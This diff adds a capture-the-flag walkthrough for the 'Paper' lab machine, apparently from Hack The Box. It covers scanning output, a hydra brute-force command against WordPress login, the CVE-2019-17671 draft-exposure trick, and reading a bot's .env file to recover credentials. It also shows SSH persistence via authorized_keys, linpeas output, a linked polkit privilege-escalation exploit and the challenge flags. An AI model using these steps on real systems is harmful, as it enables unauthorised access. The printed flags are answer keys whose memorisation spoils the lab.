@@ -1,0 +1,322 @@
+Machine IP: 10.10.11.143
+Machine Name: Paper
+Diff: Easy
+
+Nmap Ports:
+
+Nmap scan report for 10.10.11.143
+Host is up (0.48s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+Nmap Services:
+
+PORT    STATE SERVICE  VERSION                                                                
+22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)                                             
+| ssh-hostkey:                                                                                
+|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)                                
+|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)                               
+|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)                             
+80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)          
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9                   
+| http-methods:                                                                               
+|_  Potentially risky methods: TRACE                                                          
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28                                
+|_http-title: HTTP Server Test Page powered by CentOS                
+443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)   [14/45]
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName
+=US                                                                                           
+| Subject Alternative Name: DNS:localhost.localdomain                                         
+| Not valid before: 2021-07-03T08:52:34                                                       
+|_Not valid after:  2022-07-08T10:32:34
+|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+|_http-title: HTTP Server Test Page powered by CentOS
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+
+Nikto:
+
++ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'x-backend-server' found, with contents: office.paper
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-powered-by header: PHP/7.2.24
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
+
+
+Gobuster:
+
+sudo gobuster dir -u http://10.10.11.143/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+
+/manual               (Status: 301) [Size: 235] [--> http://10.10.11.143/manual/]
+
+
+
+----------------------------------------------------------------
+
+With the nikto command we found an unsual line:
+Uncommon header 'x-backend-server' found, with contents: office.paper
+
+Lets try to asign office.paper to the machine IP in /etc/hosts
+
+
+http://office.paper/ in the browser we got a different website!
+
+Lurking around the website we found interesting informations:
+
+On the post "Feeling Alone!" t here is a comment:
+
+Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!
+-Nick
+
+It seems like the Prisonmike is the admin of this website.
+Running gobuster again:
+
+sudo gobuster dir -u http://office.paper/ -w ~/lists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
+
+It's a wordpress website!!
+
+(Optional)If we had a huge list of possible users we could use the command:
+
+cewl http://office.paper/ > users.txt 
+
+This will create a list of possible users with the words found by the cewl spider.
+
+(WPSCAN)
+
+[+] Headers                                                                                   
+ | Interesting Entries:                                                                       
+ |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ |  - X-Powered-By: PHP/7.2.24
+ |  - X-Backend-Server: office.paper
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] WordPress readme found: http://office.paper/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://office.paper/index.php/feed/, <generator>https://wordpress.org/?v=5.2.3</generator>
+ |  - http://office.paper/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.3<
+/generator>
+[+] WordPress theme in use: construction-techup                                      [22/1300]
+ | Location: http://office.paper/wp-content/themes/construction-techup/
+ | Last Updated: 2021-07-17T00:00:00.000Z
+ | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt
+ | [!] The version is out of date, the latest version is 1.4
+ | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1
+ | Style Name: Construction Techup
+ | Description: Construction Techup is child theme of Techup a Free WordPress Theme useful for
+ Business, corporate a...
+ | Author: wptexture
+ | Author URI: https://testerwp.com/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.1 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Ver
+sion: 1.1'
+
+[i] No plugins Found
+[i] No Config Backups Found.
+
+Lets try hydra with the prisonmike and rockyou list:
+
+hydra -l nick -P /usr/share/wordlists/rockyou.txt office.paper http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&redirect_to=http://office.paper/wp-admin/&testcookie=1:S=Location'
+
+Bruteforcing does not seem to work!..
+
+Lets get back to the wpscan to see if we can found an CVE to wordpress 5.2.3:
+
+https://wpscan.com/wordpress/523
+
+A vulnerability in this website with the CVE number CVE-2019-17671 lets us see private posts/drafts and taking the sensitive information that we found in a post about secret information in a draft we will try to use this exploit.
+
+https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
+
+Using the proof-of-concept:
+
+http://office.paper/?static=1
+
+We got the draft!!
+
+(DRAFT)
+
+test
+
+Micheal please remove the secret from drafts for gods sake!
+
+Hello employees of Blunder Tiffin,
+
+Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.
+
+So, I kindly request you all to take your discussions from the public blog to a more private chat system.
+
+-Nick
+
+# Warning for Michael
+
+Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick
+
+Threat Level Midnight
+
+A MOTION PICTURE SCREENPLAY,
+WRITTEN AND DIRECTED BY
+MICHAEL SCOTT
+
+[INT:DAY]
+
+Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….
+
+# Secret Registration URL of new Employee chat system
+
+http://chat.office.paper/register/8qozr226AhkCHZdyY
+
+# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.
+
+# Also, stop looking at my drafts. Jeez!
+
+Set the /etc/hosts
+
+with the entry:
+
+10.10.11.143    chat.office.paper
+
+Create a User with the registration url above.
+The next thing we found in the general chat is that dwight implemented a bot that can run commands in the target machine.
+
+So after messing aroung we found some interesting data:
+
+recyclops file ../hubot/.env
+
+export ROCKETCHAT_URL='http://127.0.0.1:48320'
+export ROCKETCHAT_USER=recyclops
+export ROCKETCHAT_PASSWORD=Queenofblad3s!23
+export ROCKETCHAT_USESSL=false
+export RESPOND_TO_DM=true
+export RESPOND_TO_EDITED=true
+export PORT=8000cat 
+export BIND_ADDRESS=127.0.0.1
+
+tryng to login we receive a message:
+
+Nice Try Skynet! Bots are not allowed to login via Web Console!
+
+In the settings for this user we found an email: recyclops@office.paper
+
+Comment in his profile:
+Earth people and Polluticon destroyed my Home planet.
+  Now I will have my revenge after helping dwight!
+
+After trying some stuff we be able to ssh with dwight user name and recyclops password
+
+ssh dwight@10.10.11.143
+
+To create persistence create a pub-priv key pair in your local computer:
+
+ssh-keygen -t rsa -C "comment here"
+
+then copy the contents of the public key file to /home/Dwight/.ssh/authorized_keys
+
+
+we grab the user.txt flag:9c1b43efdb6385ffc864261120fd9a84
+
+Then we do linpeas.sh
+
+╔══════════╣ Unexpected in root      X                                                         
+/.autorelabel     
+
+
+╔══════════╣ Analyzing Other Interesting Files (limit 70)         X                             
+-rw-r--r--. 1 root root 376 Jul 27  2021 /etc/skel/.bashrc                                    
+-rw-r--r-- 1 dwight dwight 358 Jul  3  2021 /home/dwight/.bashrc                              
+                                                                                              
+/etc/cron.d:   X                                                                               
+total 20                                                                                      
+drwxr-xr-x.   2 root root   39 Nov  8  2019 .                                                 
+drwxr-xr-x. 145 root root 8192 Mar 13 15:16 ..                                                
+-rw-r--r--.   1 root root  128 Nov  8  2019 0hourly                                           
+-rw-r--r--.   1 root root  108 Aug  9  2021 raid-check                                        
+                                                                   
+
+mongodb://rocket:my$ecretPass@localhost:27017/rocketchat?replicaSet=rs01
+&authSource=rocketchat
+
+╔══════════╣ Checking if runc is available                  X                                   
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation       
+runc was found in /usr/bin/runc, you may be able to escalate privileges with it
+
+
+
+╔══════════╣ Analyzing NFS Exports Files (limit 70)     x                                       
+-rw-r--r--. 1 root root 0 Sep 10  2018 /etc/exports 
+
+╔══════════╣ Cron jobs                           x                                            
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs             
+/usr/bin/crontab                                                                              
+@reboot /home/dwight/bot_restart.sh >> /home/dwight/hubot/.hubot.log 2>&1                     
+incrontab Not Found        
+
+╔══════════╣ SUID - Check easy privesc, exploits and write perms                              
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                   
+-rwsr-xr-x. 1 root root 38K May 11  2019 /usr/bin/fusermount                                  
+-rwsr-xr-x 1 root root 78K Aug 18  2021 /usr/bin/chage                                        
+-rwsr-xr-x 1 root root 83K Aug 18  2021 /usr/bin/gpasswd                                      
+-rwsr-xr-x 1 root root 43K Aug 18  2021 /usr/bin/newgrp  --->  HP-UX_10.20                    
+-rwsr-xr-x 1 root root 50K Jul 21  2021 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1
+699.32.7_except_xnu-1699.24.8                                                                 
+-rwsr-xr-x 1 root root 49K Jul 21  2021 /usr/bin/su                                           
+-rwsr-xr-x 1 root root 33K Jul 21  2021 /usr/bin/umount  --->  BSD/Linux(08-1996)             
+-rwsr-xr-x 1 root root 65K Nov  8  2019 /usr/bin/crontab                                      
+-rwsr-xr-x 1 root root 33K Apr  6  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_
+8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                      
+-rws--x--x 1 root root 33K Jul 21  2021 /usr/bin/chfn  --->  SuSE_9.3/10                      
+-rws--x--x 1 root root 25K Jul 21  2021 /usr/bin/chsh                                         
+-rwsr-xr-x. 1 root root 61K May 11  2019 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)   
+---s--x--x 1 root root 162K Oct 25 10:30 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vul
+nerable                                                                                       
+-rwsr-xr-x 1 root root 34K May 11  2019 /usr/bin/fusermount3                                  
+-rwsr-xr-x 1 root root 12K Nov  8 01:39 /usr/sbin/grub2-set-bootflag (Unknown SUID binary)    
+-rwsr-xr-x 1 root root 12K May  7  2021 /usr/sbin/pam_timestamp_check                         
+-rwsr-xr-x 1 root root 37K May  7  2021 /usr/sbin/unix_chkpwd                                 
+-rws--x--x 1 root root 45K Aug 27  2021 /usr/sbin/userhelper                                  
+-rwsr-xr-x 1 root root 196K Jul 30  2021 /usr/sbin/mount.nfs                                  
+-rwsr-xr-x. 1 root root 18K May 11  2019 /usr/lib/polkit-1/polkit-agent-helper-1    
+
+-rwsr-x--- 1 root dbus 63K May  8  2021 /usr/libexec/dbus-1/dbus-daemon-launch-helper         
+-rwsr-xr-x 1 root root 17K Dec 21 15:04 /usr/libexec/qemu-bridge-helper (Unknown SUID binary) 
+-rwsr-x--- 1 root 973 58K Sep 10  2021 /usr/libexec/cockpit-session (Unknown SUID binary)     
+-rwsr-x--- 1 root sssd 161K Dec 21 15:14 /usr/libexec/sssd/krb5_child (Unknown SUID binary)   
+-rwsr-x--- 1 root sssd 96K Dec 21 15:14 /usr/libexec/sssd/ldap_child (Unknown SUID binary)    
+-rwsr-x--- 1 root sssd 25K Dec 21 15:14 /usr/libexec/sssd/proxy_child (Unknown SUID binary)   
+-rwsr-x--- 1 root sssd 55K Dec 21 15:14 /usr/libexec/sssd/selinux_child (Unknown SUID binary) 
+-rwsr-xr-x 1 root root 21K Feb  2  2021 /usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-ac
+l-helper (Unknown SUID binary)                                                                
+-rwsr-xr-x 1 root root 13K Jun 10  2021 /usr/libexec/Xorg.wrap
+
+After analysing all the evidences, the con jobs, the files that were running by root and dwight, i did not found a way in or something i could try to exploit i begin looking at some vulnerabilities that a system can have and i found out that this machine i vulnerable to the polkit CVE-2021-3560 attack to the dbus-send. We have more information in the following url.
+
+https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#v
+
+The exploit is here:
+
+https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
+
+After creating the user with the exploit we are able to login as root with sudo <user>
+
+Root Flag: 76085fed89beb6eab9d6057eaa580d1d
